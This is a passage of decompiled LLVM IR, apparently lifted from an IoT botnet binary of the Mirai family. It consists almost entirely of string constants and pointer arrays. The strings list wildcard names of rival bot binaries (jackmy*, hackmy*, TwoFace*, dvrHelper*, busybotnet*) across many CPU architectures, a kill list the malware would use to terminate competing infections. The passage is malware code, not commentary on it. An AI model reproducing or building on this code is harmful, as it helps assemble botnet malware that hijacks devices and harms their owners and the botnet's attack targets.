i8], [10 x i8]* @global_var_1f608.686, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f614.687, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f61c.688, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f624.689, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f630.690, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f63c.691, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f648.692, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f654.693, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f65c.694, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1f668.695, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f678.696, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f680.697, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f688.698, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f694.699, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f69c.700, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f6a4.701, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f6b0.702, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f6bc.703, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f6c8.704, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f6d4.705, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f6dc.706, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f6e4.707, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f6f0.708, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f6fc.709, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f708.710, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f714.711, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f71c.712, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1f728.713, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f738.714, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f740.715, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f748.716, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f754.717, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f760.718, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f76c.719, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f77c.720, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1f78c.721, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f79c.722, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f7ac.723, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f7b8.724, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1f7c4.725, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1f7d4.726, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1f7e4.727, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1f7f4.728, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f804.729, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1f810.730, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1f820.731, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f834.732, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f840.733, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1f84c.734, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f85c.735, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f86c.736, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f25c.597, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f878.737, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f884.738, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f88c.739, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f894.740, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f89c.741, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f8a4.742, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f8ac.743, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f8b4.744, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f8bc.745, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f8c4.746, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f8cc.747, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f8d4.748, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f8dc.749, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f8e4.750, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f8ec.751, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f8f4.752, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f8fc.753, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f904.754, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f90c.755, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f914.756, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f91c.757, i32 0, i32 0), i8* bitcast (i32* @global_var_1f924.758 to i8*), i8* bitcast (i32* @global_var_1f928.759 to i8*), i8* bitcast (i32* @global_var_1f92c.760 to i8*), i8* bitcast (i32* @global_var_1f930.761 to i8*), i8* bitcast (i32* @global_var_1f934.762 to i8*), i8* bitcast (i32* @global_var_1f938.763 to i8*), i8* bitcast (i32* @global_var_1f93c.764 to i8*), i8* bitcast (i32* @global_var_1f940.765 to i8*), i8* bitcast (i32* @global_var_1f944.766 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f948.767, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f94c.768, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f950.769, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f954.770, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f958.771, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f95c.772, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f960.773, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f964.774, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f968.775, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f96c.776, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f970.777, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f974.778, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f978.779, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f984.780, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f98c.781, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f994.782, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f99c.783, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f9a0.784, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f9a4.785, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f9a8.786, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f9ac.787, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f9b0.788, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f9b4.789, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f9b8.790, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f9bc.791, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f9c0.792, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f9c4.793, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f9c8.794, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f9cc.795, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f9d0.796, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f9d4.797, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f9d8.798, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f9dc.799, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f9e0.800, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f9e4.801, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f9e8.802, i32 0, i32 0)]
@global_var_1e474.805 = constant [8 x i8] c"jackmy*\00"
@global_var_1e47c.806 = constant [9 x i8] c"busybox*\00"
@global_var_1e488.807 = constant [5 x i8] c"bin*\00"
@global_var_1e4a0.808 = constant [5 x i8] c"arm*\00"
@global_var_1e4a8.809 = constant [8 x i8] c"mipsel*\00"
@global_var_1e4b8.810 = constant [8 x i8] c"mips64*\00"
@global_var_1e4c0.811 = constant [6 x i8] c"i686*\00"
@global_var_1e4c8.812 = constant [7 x i8] c"sparc*\00"
@global_var_1e4f4.813 = constant [6 x i8] c"bruv*\00"
@global_var_1e4fc.814 = constant [7 x i8] c"sh2eb*\00"
@global_var_1e504.815 = constant [8 x i8] c"sh2elf*\00"
@global_var_1e50c.816 = constant [5 x i8] c"x86*\00"
@global_var_1e514.817 = constant [7 x i8] c"armv5*\00"
@global_var_1e51c.818 = constant [9 x i8] c"armv4tl*\00"
@global_var_1e528.819 = constant [7 x i8] c"armv4*\00"
@global_var_1e530.820 = constant [7 x i8] c"armv6*\00"
@global_var_1e538.821 = constant [9 x i8] c"powerpc*\00"
@global_var_1e544.822 = constant [14 x i8] c"powerpc440fp*\00"
@global_var_1e554.823 = constant [6 x i8] c"i586*\00"
@global_var_1e55c.824 = constant [6 x i8] c"m68k*\00"
@global_var_1e564.825 = constant [8 x i8] c"x86_64*\00"
@global_var_1e56c.826 = constant [12 x i8] c"jackmymips*\00"
@global_var_1e578.827 = constant [14 x i8] c"jackmymips64*\00"
@global_var_1e588.828 = constant [14 x i8] c"jackmymipsel*\00"
@global_var_1e598.829 = constant [13 x i8] c"jackmysh2eb*\00"
@global_var_1e5a8.830 = constant [14 x i8] c"jackmysh2elf*\00"
@global_var_1e5b8.831 = constant [11 x i8] c"jackmysh4*\00"
@global_var_1e5c4.832 = constant [11 x i8] c"jackmyx86*\00"
@global_var_1e5d0.833 = constant [13 x i8] c"jackmyarmv5*\00"
@global_var_1e5e0.834 = constant [15 x i8] c"jackmyarmv4tl*\00"
@global_var_1e5f0.835 = constant [13 x i8] c"jackmyarmv4*\00"
@global_var_1e600.836 = constant [13 x i8] c"jackmyarmv6*\00"
@global_var_1e610.837 = constant [12 x i8] c"jackmyi686*\00"
@global_var_1e61c.838 = constant [15 x i8] c"jackmypowerpc*\00"
@global_var_1e62c.839 = constant [20 x i8] c"jackmypowerpc440fp*\00"
@global_var_1e640.840 = constant [12 x i8] c"jackmyi586*\00"
@global_var_1e64c.841 = constant [12 x i8] c"jackmym68k*\00"
@global_var_1e658.842 = constant [13 x i8] c"jackmysparc*\00"
@global_var_1e668.843 = constant [14 x i8] c"jackmyx86_64*\00"
@global_var_1e678.844 = constant [12 x i8] c"hackmymips*\00"
@global_var_1e684.845 = constant [14 x i8] c"hackmymips64*\00"
@global_var_1e694.846 = constant [14 x i8] c"hackmymipsel*\00"
@global_var_1e6a4.847 = constant [13 x i8] c"hackmysh2eb*\00"
@global_var_1e6b4.848 = constant [14 x i8] c"hackmysh2elf*\00"
@global_var_1e6c4.849 = constant [11 x i8] c"hackmysh4*\00"
@global_var_1e6d0.850 = constant [11 x i8] c"hackmyx86*\00"
@global_var_1e6dc.851 = constant [13 x i8] c"hackmyarmv5*\00"
@global_var_1e6ec.852 = constant [15 x i8] c"hackmyarmv4tl*\00"
@global_var_1e6fc.853 = constant [13 x i8] c"hackmyarmv4*\00"
@global_var_1e70c.854 = constant [13 x i8] c"hackmyarmv6*\00"
@global_var_1e71c.855 = constant [12 x i8] c"hackmyi686*\00"
@global_var_1e728.856 = constant [15 x i8] c"hackmypowerpc*\00"
@global_var_1e738.857 = constant [20 x i8] c"hackmypowerpc440fp*\00"
@global_var_1e74c.858 = constant [12 x i8] c"hackmyi586*\00"
@global_var_1e758.859 = constant [12 x i8] c"hackmym68k*\00"
@global_var_1e764.860 = constant [13 x i8] c"hackmysparc*\00"
@global_var_1e774.861 = constant [14 x i8] c"hackmyx86_64*\00"
@global_var_1e784.862 = constant [4 x i8] c"b1*\00"
@global_var_1e788.863 = constant [4 x i8] c"b2*\00"
@global_var_1e78c.864 = constant [4 x i8] c"b3*\00"
@global_var_1e790.865 = constant [4 x i8] c"b4*\00"
@global_var_1e794.866 = constant [4 x i8] c"b5*\00"
@global_var_1e798.867 = constant [4 x i8] c"b6*\00"
@global_var_1e79c.868 = constant [4 x i8] c"b7*\00"
@global_var_1e7a0.869 = constant [4 x i8] c"b8*\00"
@global_var_1e7a4.870 = constant [4 x i8] c"b9*\00"
@global_var_1e7a8.871 = constant [5 x i8] c"b10*\00"
@global_var_1e7b0.872 = constant [5 x i8] c"b11*\00"
@global_var_1e7b8.873 = constant [5 x i8] c"b12*\00"
@global_var_1e7c0.874 = constant [5 x i8] c"b13*\00"
@global_var_1e7c8.875 = constant [5 x i8] c"b14*\00"
@global_var_1e7d0.876 = constant [5 x i8] c"b15*\00"
@global_var_1e7d8.877 = constant [5 x i8] c"b16*\00"
@global_var_1e7e0.878 = constant [5 x i8] c"b17*\00"
@global_var_1e7e8.879 = constant [5 x i8] c"b18*\00"
@global_var_1e7f0.880 = constant [5 x i8] c"b19*\00"
@global_var_1e7f8.881 = constant [5 x i8] c"b20*\00"
@global_var_1e800.882 = constant [18 x i8] c"busyboxterrorist*\00"
@global_var_1e814.883 = constant [10 x i8] c"DFhxdhdf*\00"
@global_var_1e820.884 = constant [11 x i8] c"dvrHelper*\00"
@global_var_1e82c.885 = constant [9 x i8] c"FDFDHFC*\00"
@global_var_1e838.886 = constant [6 x i8] c"FEUB*\00"
@global_var_1e840.887 = constant [10 x i8] c"FTUdftui*\00"
@global_var_1e84c.888 = constant [10 x i8] c"GHfjfgvj*\00"
@global_var_1e858.889 = constant [7 x i8] c"jhUOH*\00"
@global_var_1e860.890 = constant [10 x i8] c"JIPJIPJj*\00"
@global_var_1e86c.891 = constant [11 x i8] c"JIPJuipjh*\00"
@global_var_1e878.892 = constant [9 x i8] c"kmymips*\00"
@global_var_1e884.893 = constant [11 x i8] c"kmymips64*\00"
@global_var_1e890.894 = constant [11 x i8] c"kmymipsel*\00"
@global_var_1e89c.895 = constant [10 x i8] c"kmysh2eb*\00"
@global_var_1e8a8.896 = constant [11 x i8] c"kmysh2elf*\00"
@global_var_1e8b4.897 = constant [8 x i8] c"kmysh4*\00"
@global_var_1e8bc.898 = constant [8 x i8] c"kmyx86*\00"
@global_var_1e8c4.899 = constant [10 x i8] c"kmyarmv5*\00"
@global_var_1e8d0.900 = constant [12 x i8] c"kmyarmv4tl*\00"
@global_var_1e8dc.901 = constant [10 x i8] c"kmyarmv4*\00"
@global_var_1e8e8.902 = constant [10 x i8] c"kmyarmv6*\00"
@global_var_1e8f4.903 = constant [9 x i8] c"kmyi686*\00"
@global_var_1e900.904 = constant [12 x i8] c"kmypowerpc*\00"
@global_var_1e90c.905 = constant [17 x i8] c"kmypowerpc440fp*\00"
@global_var_1e920.906 = constant [9 x i8] c"kmyi586*\00"
@global_var_1e92c.907 = constant [9 x i8] c"kmym68k*\00"
@global_var_1e938.908 = constant [10 x i8] c"kmysparc*\00"
@global_var_1e944.909 = constant [11 x i8] c"kmyx86_64*\00"
@global_var_1e950.910 = constant [9 x i8] c"lolmips*\00"
@global_var_1e95c.911 = constant [11 x i8] c"lolmips64*\00"
@global_var_1e968.912 = constant [11 x i8] c"lolmipsel*\00"
@global_var_1e974.913 = constant [10 x i8] c"lolsh2eb*\00"
@global_var_1e980.914 = constant [11 x i8] c"lolsh2elf*\00"
@global_var_1e98c.915 = constant [8 x i8] c"lolsh4*\00"
@global_var_1e994.916 = constant [8 x i8] c"lolx86*\00"
@global_var_1e99c.917 = constant [10 x i8] c"lolarmv5*\00"
@global_var_1e9a8.918 = constant [12 x i8] c"lolarmv4tl*\00"
@global_var_1e9b4.919 = constant [10 x i8] c"lolarmv4*\00"
@global_var_1e9c0.920 = constant [10 x i8] c"lolarmv6*\00"
@global_var_1e9cc.921 = constant [9 x i8] c"loli686*\00"
@global_var_1e9d8.922 = constant [12 x i8] c"lolpowerpc*\00"
@global_var_1e9e4.923 = constant [17 x i8] c"lolpowerpc440fp*\00"
@global_var_1e9f8.924 = constant [9 x i8] c"loli586*\00"
@global_var_1ea04.925 = constant [9 x i8] c"lolm68k*\00"
@global_var_1ea10.926 = constant [10 x i8] c"lolsparc*\00"
@global_var_1ea1c.927 = constant [9 x i8] c"RYrydry*\00"
@global_var_1ea28.928 = constant [9 x i8] c"telmips*\00"
@global_var_1ea34.929 = constant [11 x i8] c"telmips64*\00"
@global_var_1ea40.930 = constant [11 x i8] c"telmipsel*\00"
@global_var_1ea4c.931 = constant [10 x i8] c"telsh2eb*\00"
@global_var_1ea58.932 = constant [11 x i8] c"telsh2elf*\00"
@global_var_1ea64.933 = constant [8 x i8] c"telsh4*\00"
@global_var_1ea6c.934 = constant [8 x i8] c"telx86*\00"
@global_var_1ea74.935 = constant [10 x i8] c"telarmv5*\00"
@global_var_1ea80.936 = constant [12 x i8] c"telarmv4tl*\00"
@global_var_1ea8c.937 = constant [10 x i8] c"telarmv4*\00"
@global_var_1ea98.938 = constant [10 x i8] c"telarmv6*\00"
@global_var_1eaa4.939 = constant [9 x i8] c"teli686*\00"
@global_var_1eab0.940 = constant [12 x i8] c"telpowerpc*\00"
@global_var_1eabc.941 = constant [17 x i8] c"telpowerpc440fp*\00"
@global_var_1ead0.942 = constant [9 x i8] c"teli586*\00"
@global_var_1eadc.943 = constant [9 x i8] c"telm68k*\00"
@global_var_1eae8.944 = constant [10 x i8] c"telsparc*\00"
@global_var_1eaf4.945 = constant [11 x i8] c"telx86_64*\00"
@global_var_1eb00.946 = constant [13 x i8] c"TwoFacemips*\00"
@global_var_1eb10.947 = constant [15 x i8] c"TwoFacemips64*\00"
@global_var_1eb20.948 = constant [15 x i8] c"TwoFacemipsel*\00"
@global_var_1eb30.949 = constant [14 x i8] c"TwoFacesh2eb*\00"
@global_var_1eb40.950 = constant [15 x i8] c"TwoFacesh2elf*\00"
@global_var_1eb50.951 = constant [12 x i8] c"TwoFacesh4*\00"
@global_var_1eb5c.952 = constant [12 x i8] c"TwoFacex86*\00"
@global_var_1eb68.953 = constant [14 x i8] c"TwoFacearmv5*\00"
@global_var_1eb78.954 = constant [16 x i8] c"TwoFacearmv4tl*\00"
@global_var_1eb88.955 = constant [14 x i8] c"TwoFacearmv4*\00"
@global_var_1eb98.956 = constant [14 x i8] c"TwoFacearmv6*\00"
@global_var_1eba8.957 = constant [13 x i8] c"TwoFacei686*\00"
@global_var_1ebb8.958 = constant [16 x i8] c"TwoFacepowerpc*\00"
@global_var_1ebc8.959 = constant [21 x i8] c"TwoFacepowerpc440fp*\00"
@global_var_1ebe0.960 = constant [13 x i8] c"TwoFacei586*\00"
@global_var_1ebf0.961 = constant [13 x i8] c"TwoFacem68k*\00"
@global_var_1ec00.962 = constant [14 x i8] c"TwoFacesparc*\00"
@global_var_1ec10.963 = constant [15 x i8] c"TwoFacex86_64*\00"
@global_var_1ec20.964 = constant [10 x i8] c"UYyuyioy*\00"
@global_var_1ec2c.965 = constant [10 x i8] c"XDzdfxzf*\00"
@global_var_1ec38.966 = constant [6 x i8] c"xxb1*\00"
@global_var_1ec40.967 = constant [6 x i8] c"xxb2*\00"
@global_var_1ec48.968 = constant [6 x i8] c"xxb3*\00"
@global_var_1ec50.969 = constant [6 x i8] c"xxb4*\00"
@global_var_1ec58.970 = constant [6 x i8] c"xxb5*\00"
@global_var_1ec60.971 = constant [6 x i8] c"xxb6*\00"
@global_var_1ec68.972 = constant [6 x i8] c"xxb7*\00"
@global_var_1ec70.973 = constant [6 x i8] c"xxb8*\00"
@global_var_1ec78.974 = constant [6 x i8] c"xxb9*\00"
@global_var_1ec80.975 = constant [7 x i8] c"xxb10*\00"
@global_var_1ec88.976 = constant [7 x i8] c"xxb11*\00"
@global_var_1ec90.977 = constant [7 x i8] c"xxb12*\00"
@global_var_1ec98.978 = constant [7 x i8] c"xxb13*\00"
@global_var_1eca0.979 = constant [7 x i8] c"xxb14*\00"
@global_var_1eca8.980 = constant [7 x i8] c"xxb15*\00"
@global_var_1ecb0.981 = constant [7 x i8] c"xxb16*\00"
@global_var_1ecb8.982 = constant [7 x i8] c"xxb17*\00"
@global_var_1ecc0.983 = constant [7 x i8] c"xxb18*\00"
@global_var_1ecc8.984 = constant [7 x i8] c"xxb19*\00"
@global_var_1ecd0.985 = constant [7 x i8] c"xxb20*\00"
@global_var_1ecd8.986 = constant [3 x i8] c"1*\00"
@global_var_1ecdc.987 = constant [3 x i8] c"2*\00"
@global_var_1ece0.988 = constant [3 x i8] c"3*\00"
@global_var_1ece4.989 = constant [3 x i8] c"4*\00"
@global_var_1ece8.990 = constant [3 x i8] c"5*\00"
@global_var_1ecec.991 = constant [3 x i8] c"6*\00"
@global_var_1ecf0.992 = constant [3 x i8] c"7*\00"
@global_var_1ecf4.993 = constant [3 x i8] c"8*\00"
@global_var_1ecf8.994 = constant [3 x i8] c"9*\00"
@global_var_1ecfc.995 = constant [4 x i8] c"10*\00"
@global_var_1ed00.996 = constant [4 x i8] c"11*\00"
@global_var_1ed04.997 = constant [4 x i8] c"12*\00"
@global_var_1ed08.998 = constant [4 x i8] c"13*\00"
@global_var_1ed0c.999 = constant [4 x i8] c"14*\00"
@global_var_1ed10.1000 = constant [4 x i8] c"15*\00"
@global_var_1ed14.1001 = constant [4 x i8] c"16*\00"
@global_var_1ed18.1002 = constant [4 x i8] c"17*\00"
@global_var_1ed1c.1003 = constant [4 x i8] c"18*\00"
@global_var_1ed20.1004 = constant [4 x i8] c"19*\00"
@global_var_1ed24.1005 = constant [4 x i8] c"20*\00"
@global_var_1ed28.1006 = constant [4 x i8] c"bb*\00"
@global_var_1ed2c.1007 = constant [12 x i8] c"busybotnet*\00"
@global_var_1ed38.1008 = constant [6 x i8] c"pppd*\00"
@global_var_1ed40.1009 = constant [7 x i8] c"pppoe*\00"
@global_var_1ed48.1010 = constant [6 x i8] c"wput*\00"
@global_var_1ed50.1011 = constant [4 x i8] c"B1*\00"
@global_var_1ed54.1012 = constant [4 x i8] c"B2*\00"
@global_var_1ed58.1013 = constant [4 x i8] c"B3*\00"
@global_var_1ed5c.1014 = constant [4 x i8] c"B4*\00"
@global_var_1ed60.1015 = constant [4 x i8] c"B5*\00"
@global_var_1ed64.1016 = constant [4 x i8] c"B6*\00"
@global_var_1ed68.1017 = constant [4 x i8] c"B7*\00"
@global_var_1ed6c.1018 = constant [4 x i8] c"B8*\00"
@global_var_1ed70.1019 = constant [4 x i8] c"B9*\00"
@global_var_1ed74.1020 = constant [5 x i8] c"B10*\00"
@global_var_1ed7c.1021 = constant [5 x i8] c"B11*\00"
@global_var_1ed84.1022 = constant [5 x i8] c"B12*\00"
@global_var_1ed8c.1023 = constant [5 x i8] c"B13*\00"
@global_var_1ed94.1024 = constant [5 x i8] c"B14*\00"
@global_var_1ed9c.1025 = constant [5 x i8] c"B15*\00"
@global_var_1eda4.1026 = constant [5 x i8] c"B16*\00"
@global_var_1edac.1027 = constant [5 x i8] c"B17*\00"
@global_var_1edb4.1028 = constant [5 x i8] c"B18*\00"
@global_var_1edbc.1029 = constant [5 x i8] c"B20*\00"
@global_var_1edc4.1030 = constant [11 x i8] c"dvrhelper*\00"
@global_var_1edd0.1031 = constant [241 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e474.805, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e47c.806, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e488.807, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e490.571, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e498.576, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e4a0.808, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e4a8.809, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e4b0.570, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e4b8.810, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e4c0.811, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e4c8.812, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e4d0.574, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e4d8.565, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e4e0.575, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e4ec.567, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e4f4.813, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e4b0.570, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e4b8.810, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e4a8.809, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e4fc.814, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e504.815, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e4d0.574, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e50c.816, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e4a0.808, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e514.817, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e51c.818, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e528.819, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e530.820, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e4c0.811, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e538.821, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e544.822, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e554.823, 